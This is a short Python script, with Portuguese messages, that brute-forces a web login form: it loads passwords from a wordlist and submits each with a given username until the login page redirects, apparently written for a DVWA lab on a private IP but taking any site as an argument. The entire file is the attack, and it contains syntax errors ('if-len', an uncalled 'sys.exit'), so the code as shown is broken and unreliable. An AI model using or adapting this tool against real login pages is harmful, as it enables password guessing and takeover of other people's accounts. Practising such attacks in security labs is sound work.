import mechanicalsoup
import sys

browser = mechanicalsoup.StatefulBrowser()

if-len (sys.argv) < 3:
    print("Modo de uso: python3 atk.py + pagina + username")
    sys.exit

site = sys.argv[1]
user = sys.argv[2]

browser.open(site)

password = open("small.txt","r")
lines = password.readlines()

def atk():
    count = 0
    for p in lines:
        count += 1
        browser.select_form('form[action="login.php"]')
        browser["username"] = user
        browser["password"] = p.strip()
        browser.submit_selected()
        resposta = browser.get_url()
        if(resposta != "http://192.168.0.151/dvwa/login.php"):
            print (resposta)
            print ("senha "+str(count)+" correta: "+p)
            break
        else:
            print (resposta)
            print ("senha "+str(count)+" testada "+p)
atk()
        
        
